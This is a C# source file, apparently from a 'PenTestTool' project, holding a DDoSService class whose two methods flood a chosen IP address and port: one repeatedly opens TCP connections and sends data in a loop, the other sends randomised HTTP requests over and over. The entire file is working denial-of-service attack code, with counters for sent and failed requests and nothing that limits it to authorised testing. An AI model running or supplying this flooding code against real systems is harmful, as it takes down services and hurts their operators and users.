using PenTestTool.Pages;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace PenTestTool.Services
{
    public class DDoSService
    {
        public static int Failed = 0;
        public static int Requested = 0;
        public static int Downloaded = 0;


        public static void TCPUDPDoS(IPAddress IP, int Port, bool Resp, string Data, bool AllowRandom, int Delay)
        {
            try
            {
                IPEndPoint RHost = new IPEndPoint(IP, Port);

                while (DDoSAttack.DDOS_RUNNING)
                {
                    using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.NoDelay = true;

                        try { 
                            socket.Connect(RHost); 
                        }
                        catch 
                        { 
                            continue; 
                        }

                        socket.Blocking = Resp;

                        try
                        {
                            while (DDoSAttack.DDOS_RUNNING)
                            {
                                Requested++;
                                byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? F.RandomString() : "")));
                                socket.Send(buf);
                                if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
                            }
                        }
                        catch
                        {
                            Failed++;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("========================");
                //Console.WriteLine(ex.Message);
                //Console.WriteLine("========================");
            }
        }

        public static void HTTPDoS(IPAddress IP, int Port, bool Resp, int Delay, string Method, string Subsite, string Host, bool Random, bool AllowGzip, int Timeout)
        {
            try
            {
                IPEndPoint RHost = new IPEndPoint(IP, Port);

                while (DDoSAttack.DDOS_RUNNING)
                {
                    byte[] recvBuf = new byte[128];
                    using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.NoDelay = true;

                        try
                        {
                            socket.Connect(RHost);
                        }
                        catch
                        {
                            goto _continue;
                        }

                        byte[] buf = F.RandomHttpHeader(Method, Subsite, Host, Random, AllowGzip);

                        socket.Blocking = Resp;

                        try
                        {
                            socket.Send(buf, SocketFlags.None);
                            Requested++;

                            if (Resp)
                            {
                                socket.ReceiveTimeout = Timeout;
                                socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
                            }
                        }
                        catch
                        {
                            goto _continue;
                        }
                    }

                    Downloaded++;

                _continue:
                    if (Delay >= 0)
                        System.Threading.Thread.Sleep(Delay + 1);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("========================");
                //Console.WriteLine(ex.Message);
                //Console.WriteLine("========================");
            }
        }
    }
}
